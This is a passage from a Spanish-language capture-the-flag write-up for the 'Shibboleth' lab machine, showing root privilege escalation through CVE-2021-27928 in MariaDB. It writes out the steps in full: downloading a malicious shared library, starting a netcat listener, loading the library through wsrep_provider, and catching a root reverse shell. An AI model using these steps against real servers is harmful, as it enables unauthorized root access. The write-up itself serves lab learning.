CVE-2021-27928.so                                0%[                                                                                                   ]       0  --.-KB/s              CVE-2021-27928.so                              100%[==================================================================================================>]     476  --.-KB/s    in 0s      

2023-05-23 11:54:12 (73.2 MB/s) - ‘CVE-2021-27928.so’ saved [476/476]
```
Y le doy permisos de ejecución:
```
ipmi-svc@shibboleth:/tmp$ chmod +x CVE-2021-27928.so
```
Antes de nada me pongo en escucha ya:
```
❯ nc -nlvp 443
listening on [any] 443 ...
```
Siguiente paso, abrirme el mysql y ejectuar la siguiente linea de comando; SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";
```
ipmi-svc@shibboleth:/tmp$ mysql -uzabbix -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1946
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";
ERROR 2013 (HY000): Lost connection to MySQL server during query
```
Y a pesar del error, que confunde un poco x), hemos conseguido una reverse shell y con el usuario root:
``` 
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.124] 47164
whoami
root
hostname -I
10.10.11.124 dead:beef::250:56ff:feb9:5e97 
```
Nos lanzamos una consola, aunque no sea perfecta(sin el tratamiento), y leemos la flag de root.
```
script /dev/null -c bash
Script started, file is /dev/null
root@shibboleth:/var/lib/mysql# cat /root/root.txt
cat /root/root.txt
f4a72470813a755e0220cb7*********
```

¿Qué me ha parecido?. Pues lo de buscar por UDP no me lo esperaba. Porque he mirado un writeup que si no.. me hubiera costado bastante más. Soy consciente de que buscar puertos por UDP es una vía de ataque peero como no es lo común hubiera seguido buscando vulnerabilidades en los servicios presentes antes de eso.

Siempre se aprende algo.